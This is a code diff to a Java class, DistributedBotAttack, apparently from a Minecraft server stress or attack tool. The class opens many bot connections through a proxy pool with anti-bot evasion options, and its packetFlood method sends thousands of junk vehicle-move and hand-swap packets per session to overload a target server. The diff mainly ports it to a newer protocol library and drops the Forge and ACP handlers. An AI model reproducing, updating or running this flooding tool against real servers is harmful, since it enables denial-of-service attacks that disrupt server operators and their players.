@@ -10,22 +10,12 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicInteger;
-
-import co.akarin.endminecraftultra.Protocol.ACP;
-import co.akarin.endminecraftultra.Protocol.MCForge;
 import com.github.steveice10.mc.protocol.MinecraftProtocol;
-import com.github.steveice10.mc.protocol.data.game.entity.metadata.Position;
 import com.github.steveice10.mc.protocol.data.game.entity.object.Direction;
 import com.github.steveice10.mc.protocol.data.game.entity.player.PlayerAction;
 import com.github.steveice10.mc.protocol.packet.ingame.clientbound.*;
-import com.github.steveice10.mc.protocol.packet.ingame.clientbound.entity.ClientboundMoveVehiclePacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundChatPacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundCustomPayloadPacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundKeepAlivePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundMoveVehiclePacket;
-import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundPlayerActionPacket;
-import com.github.steveice10.mc.protocol.packet.login.serverbound.ServerboundHelloPacket;
 import com.github.steveice10.packetlib.ProxyInfo;
 import com.github.steveice10.packetlib.Session;
 import com.github.steveice10.packetlib.event.session.*;
@@ -34,6 +24,7 @@ import com.github.steveice10.packetlib.tcp.TcpClientSession;
 import com.github.steveice10.packetlib.tcp.TcpSession;
 import co.akarin.endminecraftultra.utils.mainUtils;
 import co.akarin.endminecraftultra.proxy.ProxyPool;
+import com.nukkitx.math.vector.Vector3i;
 
 public class DistributedBotAttack extends IAttack{
 
@@ -47,7 +38,6 @@ public class DistributedBotAttack extends IAttack{
     public ExecutorService pool=Executors.newCachedThreadPool();
 
     private long starttime;
-    private ACP acp=new ACP();
     public DistributedBotAttack(int time,int maxconnect,int joinsleep,boolean motdbefore,boolean tab,boolean packet1Flood,HashMap<String,String> modList,boolean antiAntiBot) {
         super(time,maxconnect,joinsleep,motdbefore,tab,modList);
         this.packetFlood = packet1Flood;
@@ -120,7 +110,7 @@ public class DistributedBotAttack extends IAttack{
     public void packetFlood(Session session){
         for (int i=0;i<3000;i++){
             session.send(new ServerboundMoveVehiclePacket(0.01,0,0,0,0.01F));
-            session.send(new ServerboundPlayerActionPacket(PlayerAction.SWAP_HANDS,new Position(0,0,0), Direction.EAST));
+            session.send(new ServerboundPlayerActionPacket(PlayerAction.SWAP_HANDS,Vector3i.ONE, Direction.EAST,69));
         }
     }
     public void setTask(Runnable task) {
@@ -165,7 +155,6 @@ public class DistributedBotAttack extends IAttack{
     public TcpClientSession createClient(final String ip, int port, final String username, ProxyInfo proxy) {
         AtomicInteger connectCountDown = new AtomicInteger(5); //wangxyper
         TcpClientSession client=new TcpClientSession(ip,port,new MinecraftProtocol(username), proxy);
-        new MCForge(client,this.modList).init();
         client.addListener(new SessionListener() {
             public void packetReceived(Session e, Packet packet) {
                 if(packet instanceof ClientboundLoginPacket){
@@ -249,8 +238,8 @@ public class DistributedBotAttack extends IAttack{
             e.printStackTrace();
         }*/
         try {
-            ClientboundTabListPacket packet = new ClientboundTabListPacket(new NETabinput(text));
-            session.send(packet);
+            //ClientboundTabListPacket packet = new ClientboundTabListPacket(new NETabinput(text));
+            //session.send(packet);
         }catch (Exception e){}
 
     }
